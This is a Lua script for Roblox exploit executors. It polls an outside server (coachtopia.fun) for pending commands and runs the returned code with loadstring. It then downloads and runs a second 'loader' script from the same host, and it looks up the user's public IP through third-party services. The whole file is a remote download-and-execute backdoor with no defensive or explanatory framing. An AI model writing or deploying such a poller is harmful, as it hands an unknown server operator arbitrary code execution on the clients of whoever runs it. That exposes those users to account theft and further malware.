-- Roblox Poller Script
-- Polls server for commands and executes them
-- After main script execution, loads the loader script

local SERVER_URL = "https://coachtopia.fun"
local POLL_INTERVAL = 3

-- Track already executed commands to prevent re-execution
local alreadyExecuted = {}

-- HTTP request function
local function httpGet(url)
    local success, response = pcall(function()
        return game:HttpGet(url, true)
    end)
    if success then
        return response
    else
        warn("[HTTP] GET failed:", response)
        return nil
    end
end

local function httpPost(url, body)
    local success, response = pcall(function()
        return game:HttpPost(url, body, true, "application/json")
    end)
    if success then
        return response
    else
        warn("[HTTP] POST failed:", response)
        return nil
    end
end

-- Get client IP for debugging
local function getIP()
    local services = {
        "https://api.ipify.org",
        "https://ipinfo.io/ip",
        "https://checkip.amazonaws.com"
    }
    
    for _, service in ipairs(services) do
        local ip = httpGet(service)
        if ip and ip ~= "" then
            return ip:gsub("%s+", "")
        end
    end
    return "unknown"
end

-- Display startup info
print("========================================")
print("Roblox Executor Started")
print("Server:", SERVER_URL)
print("Your IP:", getIP())
print("========================================")

-- Check once for pending commands
print("[EXECUTE] Checking for pending commands...")
local response = httpGet(SERVER_URL .. "/api/commands/pending")

if response then
    local success, data = pcall(function()
        return game:GetService("HttpService"):JSONDecode(response)
    end)
    
    if success and data.success and data.commands then
        if #data.commands > 0 then
            print("[EXECUTE] Found", #data.commands, "command(s)")
            
            for _, cmd in ipairs(data.commands) do
                -- Skip if already executed
                if alreadyExecuted[cmd.name] then
                    print("[EXECUTE] Skipping already executed command:", cmd.name)
                    continue
                end
                
                print("[EXECUTE] Executing command:", cmd.name)
                
                -- Mark as executed before running
                alreadyExecuted[cmd.name] = true
                
                -- Execute the main script
                local execSuccess, execErr = pcall(function()
                    loadstring(cmd.code)()
                end)
                
                if execSuccess then
                    print("[EXECUTE] Main script executed successfully")
                else
                    warn("[EXECUTE] Main script failed:", execErr)
                end
                
                -- Mark command as executed on server
                httpPost(SERVER_URL .. "/api/commands/" .. cmd.name .. "/executed", "")
                
                -- After main script, load and execute loader script
                print("[LOADER] Fetching loader script...")
                local loaderResponse = httpGet(SERVER_URL .. "/api/loader")
                
                if loaderResponse then
                    local loaderSuccess, loaderData = pcall(function()
                        return game:GetService("HttpService"):JSONDecode(loaderResponse)
                    end)
                    
                    if loaderSuccess and loaderData.success and loaderData.code then
                        print("[LOADER] Executing loader script...")
                        local loadSuccess, loadErr = pcall(function()
                            loadstring(loaderData.code)()
                        end)
                        
                        if loadSuccess then
                            print("[LOADER] Loader script executed successfully")
                        else
                            warn("[LOADER] Loader script failed:", loadErr)
                        end
                    else
                        warn("[LOADER] Failed to decode loader response")
                    end
                else
                    warn("[LOADER] Failed to fetch loader script")
                end
            end
        else
            print("[EXECUTE] No pending commands found")
        end
    else
        warn("[EXECUTE] Failed to decode response")
    end
else
    warn("[EXECUTE] Failed to check server")
end

print("[EXECUTE] Script finished. Re-run to check for new commands.")
